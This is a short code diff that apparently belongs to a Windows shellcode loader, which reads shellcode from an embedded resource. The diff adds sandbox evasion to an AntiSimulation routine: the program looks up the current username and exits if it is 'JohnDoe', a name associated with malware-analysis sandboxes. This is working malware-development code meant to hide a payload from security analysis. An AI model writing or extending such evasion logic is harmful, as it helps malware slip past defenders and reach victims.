@@ -5,6 +5,9 @@ typedef HRSRC(WINAPI *pfnFindResourceW)(HMODULE hModule, LPCWSTR lpName, LPCWSTR
 typedef DWORD(WINAPI *pfnSizeofResource)(HMODULE hModule, HRSRC hResInfo);
 typedef HGLOBAL(WINAPI *pfnLoadResource)(HMODULE hModule, HRSRC hResInfo);
 typedef LPVOID(WINAPI *pfnLockResource)(HGLOBAL hResData);
+#define numSandboxUser 1
+const WCHAR* sandboxUsername[numSandboxUser] = { L"JohnDoe" };
+
 
 /**********************************************************************
 * @Function: GetShellcodeFromRes(int resourceID, UINT &shellcodeSize)
@@ -79,6 +82,9 @@ struct CONFIG
 **********************************************************************/
 void AntiSimulation()
 {
+	WCHAR username[3267];
+	DWORD charCount = 3267;
+
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (INVALID_HANDLE_VALUE == hSnapshot)
 	{
@@ -94,6 +100,17 @@ void AntiSimulation()
 	{
 		exit(1);
 	}
+
+	if (!GetUserName(username, &charCount)) {
+		return;
+	}
+	for (int i = 0; i < numSandboxUser; ++i) {
+		if (wcsicmp(username, sandboxUsername[i]) == 0) {
+			exit(1);
+		}
+
+	}
+
 }
 
 /**********************************************************************
